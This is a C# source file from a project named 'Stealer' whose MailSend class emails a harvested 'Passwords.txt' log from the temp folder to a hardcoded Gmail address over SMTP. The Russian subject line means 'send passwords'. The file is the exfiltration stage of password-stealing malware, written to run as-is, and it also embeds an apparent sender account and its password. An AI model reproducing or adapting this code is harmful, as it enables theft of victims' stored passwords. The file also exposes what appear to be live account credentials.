using System.Net;
using System.Net.Mail;
using System.IO;
namespace Stealer
{
    class MailSend
    {
        public static void Send()
        {
            MailAddress from = new MailAddress("tolichek1984@gmail.com", "Имя (необязательно)");
            MailAddress to = new MailAddress("vitalik3221337@gmail.com", "Vitalik ");

            using (MailMessage mailMessage = new MailMessage(from, to))
            using (SmtpClient smtpClient = new SmtpClient())
            {
                mailMessage.Subject = "Пришли пароли";
                mailMessage.Body = "<h2>Изи пароли</h2>";
                mailMessage.IsBodyHtml = true;

                mailMessage.Attachments.Add(new Attachment(Path.GetTempPath() + @"log\Passwords.txt"));
                smtpClient.Host = "smtp.gmail.com";
                smtpClient.Port = 587;
                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtpClient.UseDefaultCredentials = false;
                smtpClient.Credentials = new NetworkCredential(from.Address, "le,le,sx12");
                smtpClient.EnableSsl = true;
                smtpClient.Send(mailMessage);
            }
        }
    }
}
